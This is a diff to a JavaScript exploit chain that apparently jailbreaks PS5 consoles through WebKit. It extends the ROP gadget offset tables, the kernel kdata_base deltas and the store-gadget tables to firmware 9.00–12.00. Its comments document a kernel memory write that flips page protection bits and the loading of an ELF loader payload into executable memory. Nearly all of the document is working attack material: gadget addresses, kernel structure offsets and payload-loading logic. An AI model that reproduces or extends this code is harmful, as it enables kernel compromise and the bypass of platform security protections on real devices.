@@ -425,6 +425,21 @@ const SYSCALL_NUMS = {
 // chain below never touches libc, so none of that matters here.
 //   syscall_wrapper lives in libkernel_web; everything else in libSceNKWebKit.
 //   see E:\ps5\dwarf\NETCTRL_RE\webkit_gadgets.py
+//
+// EXTENDED 09.00..12.00 — the full netcontrol window. The eight new rows
+// (10.20 10.40 10.60 11.00 11.20 11.40 11.60 12.00) came out of the retail
+// libSceNKWebKit.sprx / libkernel_web.sprx in the system_ex database by the
+// same rule the six hand-made rows already followed: take the FIRST occurrence
+// of the gadget's byte pattern inside the module's executable PT_LOAD. That
+// rule was not assumed — it was checked first, and it reproduces all 54
+// pre-existing 09.00/09.20/09.40/09.60/10.00/10.01 values byte for byte, which
+// is what makes the new rows trustworthy. Every RVA below was then disassembled
+// and string-compared against the gadget it claims to be (182 gadgets, zero
+// mismatches), so none of these is a pattern that happens to sit in a data pool.
+//
+// 10.20/10.40/10.60 being identical to 10.00 and 11.40/11.60 identical to 11.20
+// is real, not a copy-paste: those builds ship the same WebKit binary, and
+// offsets.json's independent hc/gd anchors group them the same way.
 const GADGETS = {
     "09.00": { mov_rsp_rbp: 0x2b1bbcan, pivot_rdi_rsp: 0x2b1bdaen, pop_r8: 0x1d1992fn,
                pop_rax: 0x2661dn, pop_rcx: 0x19f15n, pop_rdi: 0x17324dn,
@@ -444,6 +459,30 @@ const GADGETS = {
     "10.01": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
                pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
                pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
+    "10.20": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
+               pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
+               pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
+    "10.40": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
+               pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
+               pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
+    "10.60": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
+               pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
+               pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
+    "11.00": { mov_rsp_rbp: 0x2c56fean, pivot_rdi_rsp: 0x2c571cen, pop_r8: 0x1d8488fn,
+               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x1b46d9n,
+               pop_rdx: 0x10f32n, pop_rsi: 0x67b64n, syscall_wrapper: 0x1a8d7n },
+    "11.20": { mov_rsp_rbp: 0x2c5746an, pivot_rdi_rsp: 0x2c5764en, pop_r8: 0x1d84d0fn,
+               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x4575bn,
+               pop_rdx: 0x10f32n, pop_rsi: 0x45a94n, syscall_wrapper: 0x1a8d7n },
+    "11.40": { mov_rsp_rbp: 0x2c5746an, pivot_rdi_rsp: 0x2c5764en, pop_r8: 0x1d84d0fn,
+               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x4575bn,
+               pop_rdx: 0x10f32n, pop_rsi: 0x45a94n, syscall_wrapper: 0x1a8d7n },
+    "11.60": { mov_rsp_rbp: 0x2c5746an, pivot_rdi_rsp: 0x2c5764en, pop_r8: 0x1d84d0fn,
+               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x4575bn,
+               pop_rdx: 0x10f32n, pop_rsi: 0x45a94n, syscall_wrapper: 0x1a8d7n },
+    "12.00": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae27n },
 };
 
 // Runtime keys to fall back on when a number is missing. `pipe` used to be
@@ -970,10 +1009,17 @@ function barrier_iov() {
 //
 // lapse.js's init_threading() builds its thread on start_func = longjmp with a
 // prepared jmpbuf. Those symbols come from slopkit's lapse-offsets.json, whose
-// setjmp/longjmp entries point at DATA, not code — verified against
+// setjmp/longjmp entries pointed at DATA, not code — verified against
 // libkernel_web, libkernel, libkernel_sys and libSceLibcInternal on both 10.00
 // and 11.60. The console's own log agrees: LIBC-BASE-0xNaN, equations=0. So
 // that path executes into nothing and takes the renderer with it.
+//
+// (lapse-offsets.json no longer carries bad values — every firmware's
+// setjmp/longjmp is now recovered by matching the real function prologue in
+// libkernel_web and disassembles correctly. That does NOT resurrect the libc
+// path: this spawner is kept because it needs no libc at all, which is a
+// stronger property than having the two symbols be right. The note is left
+// standing so nobody "fixes" the offsets and assumes init_threading is usable.)
 //
 // The trick that avoids libc entirely: thr_new invokes start_func(arg) with
 // rdi = arg. Point start_func at `mov rsp, rdi; ret` and the new thread's stack
@@ -2583,6 +2629,21 @@ function run() {
      *   Entry list is circular through the map itself (the header is the map),
      *   next at +8, start at +32, end at +40.
      *
+     * Those numbers were RE'd on 10.00 alone, which was fine while the chain only
+     * ran on 10.x. It is not fine now: this function WRITES kernel memory, so a
+     * struct that shifted on 11.x or 12.x would mean stamping protection bits
+     * into some unrelated vm_map_entry. So every constant was re-checked against
+     * all fourteen kernels in ps5_kernel_collection for 09.00-12.00, and all
+     * four hold unchanged on every one of them:
+     *   - vm_map_lookup_entry reads map->root at +0x1D0 (464) and tests
+     *     entry->start +0x20 / entry->end +0x28  (unique signature match, 14/14)
+     *   - vm_map_entry_splay rotates through left +0x10 / right +0x18, which is
+     *     the traversal this walker copies                      (14/14)
+     *   - vm_map_protect's refusal reads max_protection as a 16-bit word at
+     *     +0x66, and protection/max_protection are read as a +0x64/+0x66 pair
+     *     elsewhere, confirming BOTH halves of the 32-bit access below (14/14)
+     *   - sys_mprotect derefs td->td_proc->p_vmspace at proc +0x200   (14/14)
+     *
      * So: find the entry covering our page and set both fields, then let the
      * normal mprotect succeed. Heavily guarded - this writes kernel memory, so
      * every pointer is range-checked and we only touch an entry that actually
@@ -2643,6 +2704,22 @@ function run() {
      *   so buildLapseKRW() must construct it (see its spec).                 */
     const SYS_DYNLIB_DLSYM = 591;
     const R_X86_64_RELATIVE = 8;
+
+    /* The payload is NOT a 13.60-only build despite the name, and no per-firmware
+     * elfldr needs to be produced for this port.
+     *
+     * elfldr picks its own kernel offsets at runtime: its init routine (sub_6820)
+     * reads the running firmware version and switches on it, and that switch
+     * covers 1.00 through 13.60 — every firmware in this chain's 9.00-12.00
+     * window is an explicit case with its own offset set. So one binary serves
+     * all of them, and the only per-firmware thing WE owe it is a correct
+     * kdata_base (see ALLPROC_TO_KDATA / computeKdataBase below).
+     *
+     * The filename is kept as-is so already-hosted copies keep working; it is a
+     * misnomer, not a version constraint. If elfldr is ever rebuilt, the one
+     * thing to re-check is that switch, because a firmware it does not recognise
+     * makes its init return early and the payload never comes up. */
+    const ELFLDR_URL = "elfldr-ps5-1360.elf";
 
     // sync-fetch a served binary as a byte array (x-user-defined keeps bytes 1:1)
     function fetchBytes(url) {
@@ -2745,20 +2822,49 @@ function run() {
      * we already resolve at runtime (ST.allproc) minus that symbol's static RVA
      * in x86_kernel_1000.elf. NOT YET WIRED — needs the allproc RVA + confirming
      * elfldr's anchor == that base for the 10.00 sdk case. */
+    /* allproc's distance from kdata_base, per firmware.
+     *
+     * This used to be a single 10.00 constant, which silently produced a wrong
+     * kdata_base on every other firmware — and wrong is worse than missing here,
+     * because elfldr keys ALL of its own kernel offsets off this value, so a bad
+     * anchor means it writes to the wrong kernel addresses rather than failing.
+     *
+     * The values are not re-derived guesses: they are read straight out of
+     * elfldr-ps5.elf's own firmware switch (sub_6820), which for each firmware
+     * does `allproc = kdata_base + delta`. Taking elfldr's own numbers is what
+     * makes this correct by construction — we are computing the input to a
+     * function whose behaviour we are reading.
+     *
+     * Cross-checked twice against ps5_kernel_collection, since reading the right
+     * constant out of the wrong branch would be invisible otherwise:
+     *   1. elfldr's first store is `kdata_base - N`, and N equals the kernel
+     *      ELF's text PT_LOAD size on all 20 kernels in the 9.00-12.00 window
+     *      (9.x 0xCA0000, 10.x 0xCC0000, 11.x 0xD30000, 12.x 0xD50000) — so
+     *      kdata_base is text_base + text_size, exactly as the 10.00 note said.
+     *   2. Locating sx_init(&allproc_lock, "allproc") in each of those kernels
+     *      puts allproc_lock at kdata_base + delta - 0x20 on every single one —
+     *      a uniform sizeof(struct sx), with allproc immediately after it.
+     * Both checks agree for all 20 kernels, so the grouping below is the real
+     * build grouping and not an artifact of which branch I happened to read. */
+    const ALLPROC_TO_KDATA = {
+        "09.00": 0x2755D50n, "09.20": 0x2755D50n,
+        "09.40": 0x2755D50n, "09.60": 0x2755D50n,
+        "10.00": 0x2765D70n, "10.01": 0x2765D70n, "10.20": 0x2765D70n,
+        "10.40": 0x2765D70n, "10.60": 0x2765D70n,
+        "11.00": 0x2875D70n, "11.20": 0x2875D70n,
+        "11.40": 0x2875D70n, "11.60": 0x2875D70n,
+        "12.00": 0x2885E00n,
+    };
+
     function computeKdataBase() {
-        /* RE'd (pass 57 + elfldr sub_6820 10.00 case):
-         *   allproc static = 0xFFFFFFFF83635D70 (procinit: sx_init &allproc_lock
-         *     "allproc" then LIST_INIT zeroes it; runtime low bits 0xD70 match the
-         *     leaked allproc). text base = 0xFFFFFFFF80210000 -> ALLPROC_RVA
-         *     = 0x3425D70.
-         *   elfldr's 10.00 case (v9=0x10000000) sets unk_5CB50 = kdata_base
-         *     - 13369344, and 13369344 = 0xCC0000 = LOAD0 text filesz exactly, so
-         *     unk_5CB50 = kdata_base - text_size = text_base, i.e.
-         *     kdata_base = text_base + 0xCC0000.
-         *   => kdata_base = allproc - (0x3425D70 - 0xCC0000) = allproc - 0x2765D70. */
-        const ALLPROC_TO_KDATA = 0x2765D70n;
+        const fwv = String((window.slopkit && window.slopkit.FW_VERSION) || "");
+        const delta = ALLPROC_TO_KDATA[fwv];
+        if (delta === undefined)
+            throw new Error("computeKdataBase: no allproc->kdata delta for FW '"
+                            + fwv + "' — elfldr would be handed a bogus "
+                            + "kdata_base and patch the wrong kernel addresses");
         if (!ST.allproc) throw new Error("computeKdataBase: ST.allproc unset");
-        return BigInt(ST.allproc) - ALLPROC_TO_KDATA;
+        return BigInt(ST.allproc) - delta;
     }
 
     /* Fresh RWX region via a NATIVE mmap stub. The worker-stack arena
@@ -2818,7 +2924,7 @@ function run() {
     }
 
     function loadElfldr() {
-        const buf = fetchBytes("elfldr-ps5-1360.elf");
+        const buf = fetchBytes(ELFLDR_URL);
         beacon("elfldr fetched " + buf.length + "B");
         const u16 = (o) => (buf[o] | (buf[o + 1] << 8)) & 0xffff;
         const u32 = (o) => (buf[o] | (buf[o + 1] << 8) | (buf[o + 2] << 16) | (buf[o + 3] << 24)) >>> 0;
@@ -2952,8 +3058,31 @@ function run() {
  * 0x32a57 disassembles to `mov qword ptr [rdi], rax ; ret` in the devkit's own
  * libSceNKWebKit, so it is used here for 10.00 only. Other firmwares must be
  * verified the same way before being added.
+ *
+ * They now have been. Every firmware below carries a mov_qword_rdi_rax that was
+ * disassembled out of that firmware's own retail libSceNKWebKit.sprx and
+ * string-matched against `mov qword ptr [rdi], rax ; ret` - the same standard
+ * 0x32A57 was held to, applied to all fourteen. Note this table exists BECAUSE
+ * store() needs the gadget and GADGETS does not carry it: before this, every
+ * firmware except 10.00 would build a chain with `undefined` for the store
+ * gadget, so leaving the other thirteen blank was not a neutral default.
  */
-const EXTRA_GADGETS = { "10.00": { mov_qword_rdi_rax: 0x32A57n } };
+const EXTRA_GADGETS = {
+    "09.00": { mov_qword_rdi_rax: 0x9F1AFn },
+    "09.20": { mov_qword_rdi_rax: 0x9F1AFn },
+    "09.40": { mov_qword_rdi_rax: 0x9F1AFn },
+    "09.60": { mov_qword_rdi_rax: 0x9F1AFn },
+    "10.00": { mov_qword_rdi_rax: 0x32A57n },
+    "10.01": { mov_qword_rdi_rax: 0x32A57n },
+    "10.20": { mov_qword_rdi_rax: 0x32A57n },
+    "10.40": { mov_qword_rdi_rax: 0x32A57n },
+    "10.60": { mov_qword_rdi_rax: 0x32A57n },
+    "11.00": { mov_qword_rdi_rax: 0x253An },
+    "11.20": { mov_qword_rdi_rax: 0x253An },
+    "11.40": { mov_qword_rdi_rax: 0x253An },
+    "11.60": { mov_qword_rdi_rax: 0x253An },
+    "12.00": { mov_qword_rdi_rax: 0x86197n },
+};
 
 function gadgetsFor(fw) {
     const t = GADGETS[fw];
